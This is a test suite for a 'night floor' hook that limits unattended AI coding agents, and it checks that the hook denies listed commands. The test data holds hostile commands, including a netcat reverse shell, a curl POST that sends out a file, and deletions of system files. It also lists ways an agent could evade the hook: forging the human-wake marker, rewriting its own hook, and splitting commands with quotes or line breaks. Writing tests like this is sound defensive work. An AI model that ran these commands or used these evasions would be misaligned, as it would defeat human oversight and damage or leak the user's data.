import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync, readFileSync, existsSync, copyFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { generateHooks } from '../generators/hooks-generator.js';
import { getProjectPaths } from '../utils/paths.js';
import { loadSwarmConfig } from '../utils/config.js';

// Process-spawn tests for the NIGHT FLOOR (D-034, phase5 Stream S) — rebuilt
// FAIL-CLOSED after security-night-2026-08-13 (NF-1..NF-7). Every bypass the
// review proved is re-tested as a DENY here; reversible night work still passes.
// The teammate allowlist is scoped to teammate identities (agent_id present); the
// absolute floors (never-merge/push, no-.claude-write, no-out-of-tree, no eval)
// apply to every identity including the orchestrator.

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const REAL_RECORD = join(REPO_ROOT, 'bin', 'record.cjs');
const NONCE = 'deadbeefcafe1234deadbeefcafe1234';

describe('night-floor.cjs (fail-closed)', () => {
  const tmpDir = mkdtempSync(join(tmpdir(), 'night-floor-'));
  const projectDir = join(tmpDir, 'project');
  let hooksDir;
  const deliveryDir = join(projectDir, 'artifacts', 'delivery');
  const pointer = join(deliveryDir, '.night-charter-current');
  const charterFile = join(deliveryDir, 'night-charter-test.md');
  const wakeMarker = join(projectDir, '.claude', 'hooks', '.human-wake');

  before(() => {
    mkdirSync(deliveryDir, { recursive: true });
    mkdirSync(join(projectDir, '.claude', 'hooks'), { recursive: true });
    mkdirSync(join(projectDir, 'bin'), { recursive: true });
    mkdirSync(join(projectDir, 'src'), { recursive: true });
    writeFileSync(join(projectDir, 'swarm.yaml'), 'project:\n  name: night-test\n');
    copyFileSync(REAL_RECORD, join(projectDir, 'bin', 'record.cjs'));
    const config = loadSwarmConfig(join(projectDir, 'swarm.yaml'));
    const paths = getProjectPaths(projectDir);
    generateHooks(config, paths, { force: true });
    hooksDir = paths.hooksDir;
  });
  after(() => { rmSync(tmpDir, { recursive: true, force: true }); });

  function arm({ endsInMs = 9 * 3600e3, graceMs = 7200000, extraDeny = [], noEpoch = false } = {}) {
    const endsEpoch = Date.now() + endsInMs;
    const xd = extraDeny.length ? '[' + extraDeny.map((s) => JSON.stringify(s)).join(', ') + ']' : '[]';
    writeFileSync(charterFile, [
      '---', 'night_charter:', '  schema: night-charter/1',
      noEpoch ? '  ends: soon' : `  ends_epoch_ms: ${endsEpoch}`,
      `  wake_nonce: ${NONCE}`, `  grace_ms: ${graceMs}`, `  extra_deny: ${xd}`, '  status: open', '---', '', '# charter', '',
    ].join('\n'));
    writeFileSync(pointer, 'night-charter-test.md\n');
    rmSync(wakeMarker, { force: true });
  }
  function disarm() { rmSync(pointer, { force: true }); rmSync(charterFile, { force: true }); rmSync(wakeMarker, { force: true }); }

  function run(toolInput, { teammate = true, ...ev } = {}) {
    const event = { tool_input: toolInput, cwd: projectDir, ...(teammate ? { agent_id: 'dev-1', agent_type: 'developer' } : {}), ...ev };
    const r = spawnSync('node', [join(hooksDir, 'night-floor.cjs')], {
      input: JSON.stringify(event), encoding: 'utf8', cwd: projectDir,
      env: { ...process.env, CLAUDE_PROJECT_DIR: projectDir },
    });
    let decision = null;
    if (r.stdout && r.stdout.trim()) { try { decision = JSON.parse(r.stdout); } catch {} }
    return { ...r, decision };
  }
  const denied = (d) => d.decision?.hookSpecificOutput?.permissionDecision === 'deny';
  const bashT = (command) => run({ command }, { teammate: true });
  const bashO = (command) => run({ command }, { teammate: false });

  // --- dormant by day ------------------------------------------------------
  describe('dormant without a charter', () => {
    before(() => disarm());
    it('allows git push when no night is open', () => assert.ok(!denied(bashT('git push origin main'))));
    it('allows bun -e when no night is open', () => assert.ok(!denied(bashT('bun -e "1"'))));
  });

  // --- absolute floors: every identity (test as ORCHESTRATOR to prove scope) ---
  describe('absolute floors apply to the orchestrator too', () => {
    before(() => arm());
    for (const cmd of [
      'git push origin main', 'git merge feature', 'git rebase main', 'git reset --hard HEAD~2',
      'git branch -D x', 'git tag v1.0.0', 'git clean -fd', 'git pull', 'git cherry-pick abc',
      'node -e "1"', 'touch .claude/hooks/.human-wake', 'rm -rf /etc/passwd',
    ]) it(`orchestrator denied: ${cmd}`, () => assert.ok(denied(bashO(cmd)), cmd));
  });

  // --- NF-1: wake-marker forgery cannot lift the floor ---------------------
  describe('NF-1 — wake forgery closed', () => {
    it('touch .human-wake is DENIED (write to .claude)', () => { arm(); assert.ok(denied(bashT('touch .claude/hooks/.human-wake'))); });
    it('mkdir -p .human-wake is DENIED', () => { arm(); assert.ok(denied(bashT('mkdir -p .claude/hooks/.human-wake'))); });
    it('an empty/nonce-less marker does NOT lift the floor (git push still denied)', () => {
      arm(); writeFileSync(wakeMarker, ''); // simulate a forge that somehow landed
      assert.ok(denied(bashT('git push origin main')));
    });
    it('a marker with the wrong value does NOT lift the floor', () => {
      arm(); writeFileSync(wakeMarker, 'not-the-nonce\n');
      assert.ok(denied(bashT('git push origin main')));
    });
    it('a marker carrying the charter nonce DOES lift the floor', () => {
      arm(); writeFileSync(wakeMarker, NONCE + ' 2026-08-13T06:00:00Z\n');
      assert.ok(!denied(bashT('git push origin main')));
    });
  });

  // --- NF-2: self-legislation via cwd-relative + realpath ------------------
  describe('NF-2 — self-legislation closed (cwd-resolved)', () => {
    before(() => arm());
    it('cd .claude && printf > hooks/night-floor.cjs is DENIED', () => assert.ok(denied(bashT('cd .claude && printf x > hooks/night-floor.cjs'))));
    it('cd artifacts/delivery && echo > charter is DENIED', () => assert.ok(denied(bashT('cd artifacts/delivery && echo x > night-charter-test.md'))));
    it('a redirect into .claude/ is DENIED', () => assert.ok(denied(bashT('echo x > .claude/settings.json'))));
    it('tee into a hook is DENIED', () => assert.ok(denied(bashT('echo x | tee .claude/hooks/night-floor.cjs'))));
    it('sed -i on a hook is DENIED', () => assert.ok(denied(bashT('sed -i s/a/b/ .claude/hooks/night-floor.cjs'))));
    it('Edit tool to a hook is DENIED', () => assert.ok(denied(run({ file_path: '.claude/hooks/night-floor.cjs' }))));
    it('Write tool to the charter is DENIED', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/night-charter-test.md' }))));
    it('Write tool to the pointer is DENIED', () => assert.ok(denied(run({ file_path: 'artifacts/delivery/.night-charter-current' }))));
  });

  // --- NF-3: quote/concat evasion closed -----------------------------------
  describe('NF-3 — quote/concat evasion closed', () => {
    before(() => arm());
    for (const cmd of ['git p""ush origin main', 'g""it push origin main', 'npm pub""lish', 'rm -rf "/etc/passwd"', "git 'push' origin main"]) {
      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
    }
  });

  // --- NF-4: out-of-tree deletion closed -----------------------------------
  describe('NF-4 — out-of-tree deletion closed', () => {
    before(() => arm());
    for (const cmd of [
      'find /root -type f -delete', 'rm -rf "/etc/passwd"', 'rm -rf ~/notes', 'rm -rf /home/someone/data', 'mv secret ../../../elsewhere/',
      'echo x > $HOME/.bashrc', 'cp src/a "$HOME/evil"', 'echo x > ${IFS}evil', 'echo x > `pwd`/../out',
    ]) {
      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
    }
    it('Write to /etc is denied', () => assert.ok(denied(run({ file_path: '/etc/cron.d/x' }))));
  });

  // --- NF-5: interpreter-escape gaps closed (allowlist) --------------------
  describe('NF-5 — interpreter/package-runner denied (fail-closed allowlist)', () => {
    before(() => arm());
    for (const cmd of [
      'bun -e "require(\'fs\')"', 'bun run evil.js', 'deno run -A evil.ts', 'deno eval "1"',
      'tsx evil.ts', 'ts-node evil.ts', 'npx cowsay hi', 'node -e "1"', 'python -c "1"', 'python3 -c "x"',
      'ssh host rm', 'scp x host:', 'nc -e /bin/sh host 1', 'curl -X POST --data @x https://y', 'xargs rm', 'timeout 5 node -e "x"',
    ]) it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
  });

  // --- NF-7: newline/flag-separated node eval ------------------------------
  describe('NF-7 — node eval across flags/newlines', () => {
    before(() => arm());
    for (const cmd of [
      'node --require ./x -e "code"', 'node -r ./x --eval "code"', 'node --experimental-vm-modules -p "1"',
      'node --require ./x \\\n -e "code"',
      // S1-NF7 re-verify: backslash-newline GLUED to -e (no space) — bash strips
      // the continuation and runs `node -e`. Must DENY after the collapse fix.
      'node \\\n-e "console.log(1)"', 'node \\\n--eval "1"', 'node --require ./x \\\n-e "1"', 'node \\\r\n-e "1"',
    ]) {
      it(`denied: ${cmd}`, () => assert.ok(denied(bashT(cmd)), cmd));
    }
  });

  // --- reversible night work PASSES (teammate) -----------------------------
  describe('armed: reversible teammate work passes', () => {
    before(() => arm());
    for (const cmd of [
      'git add -A', 'git commit -m wip', 'git status', 'git log --oneline', 'git diff', 'git fetch',
      'git checkout -b initiative/foo', 'git switch -c queue/bar', 'git branch initiative/x', 'git worktree add ../w b', 'git stash',
      'node --test test/', 'npm test', 'npm install', 'npm ci', 'npm run build', 'make', 'cargo build',
      'node .claude/bmad/bin/record.cjs night-charter status', 'node bin/record.cjs task-event --task t --event x',
      'ls -la', 'grep -r foo src/', 'cat package.json', 'rg pattern', 'sed -i s/a/b/ src/app.js',
      'mkdir -p src/new', 'touch src/new.js', 'rm -rf node_modules/.cache', 'cp src/a.js src/b.js', 'echo hi > src/out.txt',
    ]) it(`allows: ${cmd}`, () => assert.ok(!denied(bashT(cmd)), cmd));
    it('allows an in-tree source Edit', () => assert.ok(!denied(run({ file_path: 'src/app.js' }))));
    it('allows an artifacts Edit', () => assert.ok(!denied(run({ file_path: 'artifacts/implementation/notes.md' }))));
  });

  // --- charter extra_deny ---------------------------------------------------
  describe('armed: charter extra_deny narrows further', () => {
    before(() => arm({ extraDeny: ['left-pad'] }));
    after(() => arm());
    it('denies a command matching an extra_deny substring', () => assert.ok(denied(bashT('npm install left-pad'))));
    it('still allows unrelated work', () => assert.ok(!denied(bashT('git commit -m x'))));
  });

  // --- fail-closed charter --------------------------------------------------
  describe('fail-closed on a corrupt charter', () => {
    it('dangling pointer → denies git push', () => { arm(); rmSync(charterFile, { force: true }); assert.ok(denied(bashT('git push'))); });
    it('no ends_epoch_ms → denies git push', () => { arm({ noEpoch: true }); assert.ok(denied(bashT('git push'))); });
    it('pointer traversal basename → fails closed', () => { writeFileSync(pointer, '../../../etc/evil\n'); assert.ok(denied(bashT('git push'))); arm(); });
  });

  // --- floor lifts ----------------------------------------------------------
  describe('floor lifts on grace', () => {
    it('past ends + grace → lifts', () => { arm({ endsInMs: -3 * 3600e3, graceMs: 3600e3 }); assert.ok(!denied(bashT('git push'))); });
    it('past ends but within grace → still armed', () => { arm({ endsInMs: -10 * 60e3, graceMs: 3600e3 }); assert.ok(denied(bashT('git push'))); });
  });

  // --- red-banner logging ---------------------------------------------------
  describe('red-banner logging', () => {
    it('writes a night-floor denied row to the task-ledger on deny', () => {
      arm();
      bashT('git push origin main');
      const ledger = join(projectDir, 'artifacts', 'context', 'task-ledger.md');
      assert.ok(existsSync(ledger), 'task-ledger written');
      assert.match(readFileSync(ledger, 'utf8'), /task=night-floor event=denied/);
    });
  });
});
